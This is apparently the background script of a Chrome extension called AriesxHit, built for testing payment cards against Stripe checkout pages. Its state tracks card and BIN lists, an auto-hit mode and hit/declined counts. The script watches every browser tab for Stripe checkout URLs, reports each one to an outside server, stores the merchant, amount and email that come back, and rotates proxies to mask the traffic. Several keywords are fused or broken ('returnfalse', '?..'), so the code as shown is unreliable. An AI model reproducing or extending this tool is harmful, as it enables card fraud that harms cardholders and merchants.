importScripts('tg-config.js');
const state= {
    'cardList':[],'binList':[],'autoHitActive':false,'logs':[],'stats': {
        'hits':0,'tested':0,'declined':0
    },
    'monitoredTabs':new Set(),'proxyList':[],'proxyIndex':0,'proxyEnabled':false,'currentCheckoutSession':null,'usedCardsInSession':new Set(),'currentMode':'cc_list','lastCheckoutUrl':null,'lastAnalyzedCheckoutUrl':null
},
API_BASE='https://aries.mikeyyfrr.me';
function isStripeCheckoutHost(_v1) {
    if(!_v1||typeof _v1!=='string')returnfalse;
    try {
        const _v2=new URL(_v1),_v3=(_v2.host||'').toLowerCase();
        if(_v3==='checkout.stripe.com')returntrue;
        if(_v3.startsWith('checkout.'))returntrue;
        returnfalse;
    }
    catch(_v4) {
        returnfalse;
    }
}
chrome.tabs.onUpdated.addListener((_v5,_v6,_v7)=> {
    const _v8=_v6.url||_v7?..url;
    if(!_v8||!isStripeCheckoutHost(_v8))return;
    try {
        fetch(API_BASE+'/api/tg/checkout-info', {
            'method':'POST','headers': {
                'Content-Type':'application/json'
            },
            'body':JSON.stringify( {
                'checkout_url':_v8
            }
            )
        }
        ).then(_v9=>_v9.json().catch(()=>( {
        }
        ))).then(_v10=> {
            if(!_v10||!_v10.ok)return;
            const _v11= {
                'merchant_url':_v10.merchant_url||_v10.business_url||'','business_name':_v10.business_name||'','amount':_v10.amount||'','amount_minor':_v10.amount_minor,'currency':_v10.currency||'','email':_v10.email||''
            };
            try {
                chrome.storage.local.set( {
                    'ariesxhit_checkout_meta':_v11
                },
                ()=> {
                }
                );
            }
            catch(_v12) {
            }
        }
        ).catch(()=> {
        }
        );
    }
    catch(_v13) {
    }
}
);
function parseProxyLine(_v14) {
    _v14=String(_v14).trim();
    if(!_v14)return null;
    const _v15=_v14.indexOf('@');
    if(_v15>0) {
        const _v16=_v14.slice(0,_v15),_v17=_v14.slice(_v15+1),_v18=_v17.split(':');
        if(_v18.length>=2) {
            const _v19=parseInt(_v18[_v18.length-1],10),_v20=_v18.slice(0,-1).join(':').trim(),_v21=_v16.indexOf(':'),_v22=_v21>=0?_v16.slice(0,_v21):_v16,_v23=_v21>=0?_v16.slice(_v21+1):'';
            return {
                'host':_v20,'port':isNaN(_v19)?8080:_v19,'user':_v22,'pass':_v23
            };
        }
    }
    const _v24=_v14.split(':');
    if(_v24.length===2) {
        const _v25=parseInt(_v24[1],10);
        return {
            'host':_v24[0].trim(),'port':isNaN(_v25)?8080:_v25
        };
    }
    if(_v24.length>=4) {
        const _v26=_v24[0].trim(),_v27=parseInt(_v24[1],10),_v28=_v24[2],_v29=_v24.slice(3).join(':');
        return {
            'host':_v26,'port':isNaN(_v27)?8080:_v27,'user':_v28,'pass':_v29
        };
    }
    return null;
}
function parseProxies(_v30) {
    if(!_v30||typeof _v30!=='string')return[];
    return _v30.split(/\r?\n/).map(parseProxyLine).filter(Boolean);
}
function applyProxy(_v31) {
    if(!_v31||!_v31.host||!chrome.proxy?..settings?..set)return;
    const _v32= {
        'mode':'fixed_servers','rules': {
            'singleProxy': {
                'scheme':'http','host':_v31.host,'port':_v31.port
            },
            'bypassList':['localhost','127.0.0.1']
        }
    };
    chrome.proxy.settings.set( {
        'value':_v32,'scope':'regular'
    },
    ()=> {
        if(chrome.runtime.lastError)console.warn('[AriesxHit]\x20Proxy\x20apply\x20failed:',chrome.runtime.lastError);
    }
    );
}
function clearProxy() {
    if(!chrome.proxy?..settings?..set)return;
    chrome.proxy.settings.set( {
        'value': {
            'mode':'system'
        },
        'scope':'regular'
    },
    ()=> {
    }
    );
}